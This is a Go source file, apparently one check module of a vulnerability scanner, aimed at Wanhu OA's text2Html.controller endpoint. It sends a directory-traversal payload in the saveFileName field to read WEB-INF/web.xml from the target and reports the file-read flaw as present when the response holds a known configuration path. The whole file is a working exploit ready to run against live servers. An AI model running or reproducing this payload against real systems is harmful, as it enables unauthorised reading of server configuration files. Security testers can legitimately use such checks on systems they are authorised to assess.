package wanhu_text2Html

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/defaultroot/convertFile/text2Html.controller"

	// 构建手动的请求体
	body := "saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html\r\n"

	// 发送POST请求
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":   UA,
			"Content-Type": "application/x-www-form-urlencoded",
		}).
		SetBodyString(body).
		Post(vulnUrl)

	if err == nil && resp.StatusCode == 200 {
		if strings.Contains(resp.String(), "/WEB-INF/struts-config/foregroundres-config.xml") {
			return true
		}
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		color.Green.Println("[+09] 万户OA text2Html 任意文件读取存在 -> ", url)
	} else {
		color.Red.Println("[-09] 万户OA text2Html 任意文件读取不存在")
	}
}
